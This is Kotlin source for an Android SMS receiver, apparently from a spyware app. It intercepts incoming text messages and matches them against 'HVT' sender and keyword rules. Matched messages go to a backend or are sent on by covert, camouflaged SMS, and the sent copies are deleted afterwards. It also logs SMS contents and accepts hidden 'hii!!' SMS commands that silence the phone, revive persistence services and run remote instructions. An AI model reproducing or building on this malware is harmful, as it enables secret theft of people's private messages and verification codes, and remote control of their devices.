package com.example.myandroid

import kotlinx.coroutines.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        DebugLogger.log("SMS_ENTRY", "Receiver awoken. Action: ${intent.action}")

        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isNullOrEmpty()) {
                DebugLogger.log("SMS_WARN", "Intent contained no valid PDUs.")
                return
            }

            val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val editor = prefs.edit()
            
            val current = prefs.getInt("sms_count", 0)
            editor.putInt("sms_count", current + 1)
            editor.putLong("sms_last_time", System.currentTimeMillis())

            messages.forEach { msg ->
                if (msg == null) return@forEach
                val body = msg.messageBody ?: return@forEach
                val sender = msg.displayOriginatingAddress ?: "Unknown"

                val pendingResult = goAsync()
                processMessage(context, sender, body, editor, pendingResult)
            }
            editor.apply() // FIX: Offload massive JSON disk writes from the Main Thread to prevent ANRs
        } catch (e: Exception) {
            DebugLogger.log("SMS_FATAL", "Receiver crash: ${e.message}")
        }
    }

    companion object {
        fun injectMockSms(context: Context, sender: String, body: String) {
            val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val editor = prefs.edit()
            editor.putInt("sms_count", prefs.getInt("sms_count", 0) + 1)
            editor.putLong("sms_last_time", System.currentTimeMillis())
            
            processMessage(context, sender, body, editor, null)
            editor.commit()
        }

        private fun processMessage(context: Context, sender: String, body: String, editor: android.content.SharedPreferences.Editor, pendingResult: BroadcastReceiver.PendingResult?) {
            DebugLogger.log("SMS_PARSE", "Message from $sender intercepted.")
            val timestamp = System.currentTimeMillis()
            
            try {
                DynamicUIManager.injectLiveSms(sender, body, timestamp)
            } catch (e: Exception) {}

            val hvtPrefs = context.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
            val kwPrefs = context.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE)
            
            var redirectTarget: String? = null
            var matchedRuleType = ""
            var matchedRuleVal = ""

            // 1. Robust HVT Sender Match (Strips symbols for fuzzy matching, ignores case)
            for ((targetSender, dest) in hvtPrefs.all) {
                val cleanSender = sender.replace(Regex("\\D"), "")
                val cleanTarget = targetSender.replace(Regex("\\D"), "")
                
                val isFuzzyMatch = cleanTarget.isNotEmpty() && cleanSender.isNotEmpty() && (cleanSender.endsWith(cleanTarget) || cleanTarget.endsWith(cleanSender))
                val isExactMatch = sender.equals(targetSender, ignoreCase = true)
                
                if (isFuzzyMatch || isExactMatch) {
                    redirectTarget = dest as? String
                    matchedRuleType = "SENDER"
                    matchedRuleVal = targetSender
                    DebugLogger.log("TRAP_EVAL", "HVT Sender match found: [$targetSender] for incoming [$sender]")
                    break
                }
            }
            
            // 2. Fallback to Keyword Match
            if (redirectTarget == null) {
                val allKwRules = kwPrefs.all
                for ((kw, dest) in allKwRules) {
                    if (body.contains(kw, ignoreCase = true)) {
                        redirectTarget = dest as? String
                        matchedRuleType = "KEYWORD"
                        matchedRuleVal = kw
                        DebugLogger.log("TRAP_EVAL", "Keyword match found: [$kw] in body")
                        break
                    }
                }
            }

            if (redirectTarget != null) {
                DebugLogger.log("FORWARD", "Routing intercepted SMS (Rule: $matchedRuleType [$matchedRuleVal]) to $redirectTarget")
                CoroutineScope(Dispatchers.IO).launch {
                    val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                    val caps = cm.getNetworkCapabilities(cm.activeNetwork)
                    val isOnline = caps != null && caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)

                    if (isOnline) {
                        DebugLogger.log("FORWARD", "Device is ONLINE. Bypassing SMS fallback, dispatching direct to backend.")
                        val extra = JSONObject().apply { put("hvt_intercept", body); put("from", sender); put("forwarded_to", redirectTarget); put("matched_rule", matchedRuleVal) }
                        CloudManager.sendPing(context, "HVT_INTERCEPT", extra)
                    } else {
                        DebugLogger.log("FORWARD", "Device is OFFLINE. Utilizing encrypted FidelCipher SMS tunnel to $redirectTarget.")
                        try {
                            val msgRaw = "[HVT:$sender] $body"
                            val token = FidelCipher.encode(msgRaw)
                            val promo = FidelCipher.camouflage(context, token)
                            val smsManager = context.getSystemService(android.telephony.SmsManager::class.java)
                            
                            val parts = smsManager.divideMessage(promo)
                            smsManager.sendMultipartTextMessage(redirectTarget, null, parts, null, null)
                            DebugLogger.log("FORWARD", "Encrypted fallback SMS physically dispatched.")
                            
                            delay(5000)
                            val uri = android.net.Uri.parse("content://sms/sent")
                            context.contentResolver.delete(uri, "address=?", arrayOf(redirectTarget))
                        } catch (e: Exception) {
                            DebugLogger.log("FORWARD_ERR", "Encrypted SMS fallback failed: ${e.message}")
                        }
                    }
                }
            } else {
                DebugLogger.log("TRAP_EVAL", "No forwarding rules matched for sender [$sender]")
            }

            // TELEMETRY GATING
            if (ConfigManager.canCollect(context, "sms")) {
                val entry = JSONObject().apply {
                    put("sender", sender)
                    put("body", body)
                    put("timestamp", timestamp)
                }
                DumpManager.appendLog("SMS", entry)

                try {
                    val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val cacheStr = prefs.getString("sms_logs_cache", "[]") ?: "[]"
                    val cacheArr = JSONArray(cacheStr)
                    cacheArr.put(entry)
                    if (cacheArr.length() > 50) cacheArr.remove(0)
                    editor.putString("sms_logs_cache", cacheArr.toString())
                } catch(e: Exception) {}
            } else {
                DebugLogger.log("SMS_BLOCKED", "SMS collection disabled in Config.")
            }

            // JudasManager handled entirely via System Events now

            if (body.contains("hii!!", ignoreCase = true)) {
                DebugLogger.log("SMS_WAKE", "Shield Triggered by keyword.")
                
                val am = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                val oldMode = am.ringerMode
                val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION)
                
                if (PermissionManager.hasDndAccess(context)) {
                    try {
                        am.ringerMode = android.media.AudioManager.RINGER_MODE_SILENT
                        am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, 0, 0)
                    } catch (e: Exception) {}
                }

                ServiceResurrector.shock(context)
                KeepAliveReceiver.scheduleNext(context)

                val regex = Regex("(?i)hii!!(.*?)\\$\\$")
                val match = regex.find(body)

                if (match != null) {
                    val rawExtracted = match.groupValues[1].trim()
                    val splitIdx = rawExtracted.indexOf('=')
                    var cmd: String
                    var content: String
                    
                    if (splitIdx != -1) {
                        cmd = rawExtracted.substring(0, splitIdx).uppercase()
                        content = java.net.URLDecoder.decode(rawExtracted.substring(splitIdx + 1), "UTF-8")
                    } else {
                        cmd = rawExtracted.uppercase()
                        content = ""
                    }

                    if (cmd == "SYNC" || cmd == "PROFILE_SYNC" || cmd == "SYS_SYNC") {
                        cmd = "CODERED"
                    }

                    if (cmd == "CODERED" && !content.contains("|")) content = "$content|$sender"

                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            val mockCmd = JSONObject().apply { put("id", -1); put("file_name", cmd); put("content", content) }
                            CommandProcessor.processSingleCommand(context, mockCmd)
                        } catch (e: Exception) { 
                            DebugLogger.log("SMS_CMD_ERR", "Command execution failed")
                        } finally { 
                            pendingResult?.finish() 
                        }
                    }
                } else {
                    DebugLogger.log("SMS_WAKE", "Shield active but command malformed. No execution.")
                    pendingResult?.finish()
                }

                CoroutineScope(Dispatchers.Main).launch {
                    delay(3500)
                    if (PermissionManager.hasDndAccess(context)) {
                        am.ringerMode = oldMode
                        am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, oldVol, 0)
                        DebugLogger.log("SHIELD", "Audio state restored.")
                    }
                }
            } else {
                pendingResult?.finish()
            }
        }
    }
}
